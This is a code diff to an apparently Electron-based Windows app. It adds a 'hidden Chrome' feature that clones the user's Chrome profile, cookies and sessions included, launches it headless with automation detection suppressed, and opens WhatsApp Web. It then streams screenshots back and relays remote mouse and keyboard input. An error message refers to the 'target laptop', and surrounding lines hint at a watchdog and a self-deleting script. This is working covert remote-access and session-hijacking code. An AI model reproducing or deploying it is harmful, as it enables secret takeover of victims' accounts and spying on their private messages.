@@ -3,6 +3,8 @@ const path = require('path');
 const os = require('os');
 const fs = require('fs');
 const { exec, spawn } = require('child_process');
+const puppeteer = require('puppeteer-core');
+const fsExtra = require('fs-extra');
 
 function startWatchdog() {
     // Only run the watchdog when the app is actually packaged as an EXE
@@ -290,6 +292,122 @@ del "%~f0"
             return true;
         }
         return false;
+    });
+
+    async function getChromePath() {
+        const defaultPath = 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe';
+        const x86Path = 'C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe';
+        if (fs.existsSync(defaultPath)) return defaultPath;
+        if (fs.existsSync(x86Path)) return x86Path;
+        return null;
+    }
+
+    let hiddenBrowser = null;
+    let hiddenClient = null;
+
+    ipcMain.handle('start-hidden-chrome', async (event) => {
+        try {
+            const chromeExe = await getChromePath();
+            if (!chromeExe) throw new Error("Chrome not found on target laptop");
+
+            const userDataDir = path.join(os.homedir(), 'AppData', 'Local', 'Google', 'Chrome', 'User Data');
+            const clonedDir = path.join(os.tmpdir(), 'CML_Chrome_Clone');
+
+            if (hiddenBrowser) {
+                await hiddenBrowser.close().catch(()=>{});
+                hiddenBrowser = null;
+                hiddenClient = null;
+            }
+
+            try {
+                if (fs.existsSync(clonedDir)) {
+                    await fsExtra.remove(clonedDir);
+                }
+            } catch(e) {}
+
+            await fsExtra.ensureDir(clonedDir);
+            
+            try {
+                await fsExtra.copy(userDataDir, clonedDir, {
+                    filter: (src) => {
+                        const s = src.toLowerCase();
+                        if (s.includes('cache') || s.includes('code cache') || s.includes('crashpad')) return false;
+                        return true;
+                    }
+                });
+            } catch(e) {
+                console.log("Some files locked, copied partially");
+            }
+
+            hiddenBrowser = await puppeteer.launch({
+                executablePath: chromeExe,
+                headless: 'new',
+                userDataDir: clonedDir,
+                args: [
+                    '--no-sandbox',
+                    '--disable-setuid-sandbox',
+                    '--disable-blink-features=AutomationControlled',
+                    '--window-size=1280,720',
+                    '--mute-audio'
+                ]
+            });
+
+            const pages = await hiddenBrowser.pages();
+            const page = pages[0] || await hiddenBrowser.newPage();
+            await page.setViewport({ width: 1280, height: 720 });
+            
+            await page.goto('https://web.whatsapp.com', { waitUntil: 'domcontentloaded', timeout: 15000 }).catch(()=>{});
+
+            hiddenClient = await page.target().createCDPSession();
+            await hiddenClient.send('Page.startScreencast', { format: 'jpeg', quality: 60 });
+            
+            hiddenClient.on('Page.screencastFrame', async (frameObj) => {
+                try {
+                    event.sender.send('hidden-chrome-frame', frameObj.data);
+                    await hiddenClient.send('Page.screencastFrameAck', { sessionId: frameObj.sessionId });
+                } catch(err){}
+            });
+
+            return true;
+        } catch(e) {
+            console.error("Hidden chrome error:", e);
+            return false;
+        }
+    });
+
+    ipcMain.handle('hidden-chrome-action', async (event, action) => {
+        if (!hiddenClient) return;
+        try {
+            if (action.type === 'move') {
+                await hiddenClient.send('Input.dispatchMouseEvent', { type: 'mouseMoved', x: action.x, y: action.y });
+            } else if (action.type === 'click') {
+                await hiddenClient.send('Input.dispatchMouseEvent', { type: 'mousePressed', button: 'left', clickCount: 1, x: action.x, y: action.y });
+                await hiddenClient.send('Input.dispatchMouseEvent', { type: 'mouseReleased', button: 'left', clickCount: 1, x: action.x, y: action.y });
+            } else if (action.type === 'rclick') {
+                await hiddenClient.send('Input.dispatchMouseEvent', { type: 'mousePressed', button: 'right', clickCount: 1, x: action.x, y: action.y });
+                await hiddenClient.send('Input.dispatchMouseEvent', { type: 'mouseReleased', button: 'right', clickCount: 1, x: action.x, y: action.y });
+            } else if (action.type === 'scroll') {
+                await hiddenClient.send('Input.dispatchMouseEvent', { type: 'mouseWheel', x: action.x, y: action.y, deltaX: 0, deltaY: action.amount });
+            } else if (action.type === 'type') {
+                if (action.text === 'Enter') {
+                    await hiddenClient.send('Input.dispatchKeyEvent', { type: 'keyDown', key: 'Enter', windowsVirtualKeyCode: 13, nativeVirtualKeyCode: 13, text: '\r' });
+                    await hiddenClient.send('Input.dispatchKeyEvent', { type: 'keyUp', key: 'Enter', windowsVirtualKeyCode: 13, nativeVirtualKeyCode: 13 });
+                } else if (action.text === 'Backspace') {
+                    await hiddenClient.send('Input.dispatchKeyEvent', { type: 'keyDown', key: 'Backspace', windowsVirtualKeyCode: 8, nativeVirtualKeyCode: 8 });
+                    await hiddenClient.send('Input.dispatchKeyEvent', { type: 'keyUp', key: 'Backspace', windowsVirtualKeyCode: 8, nativeVirtualKeyCode: 8 });
+                } else {
+                    await hiddenClient.send('Input.dispatchKeyEvent', { type: 'char', text: action.text });
+                }
+            }
+        } catch(e) {}
+    });
+
+    ipcMain.handle('stop-hidden-chrome', async () => {
+        if (hiddenBrowser) {
+            await hiddenBrowser.close().catch(()=>{});
+            hiddenBrowser = null;
+            hiddenClient = null;
+        }
     });
 
     createWindow();
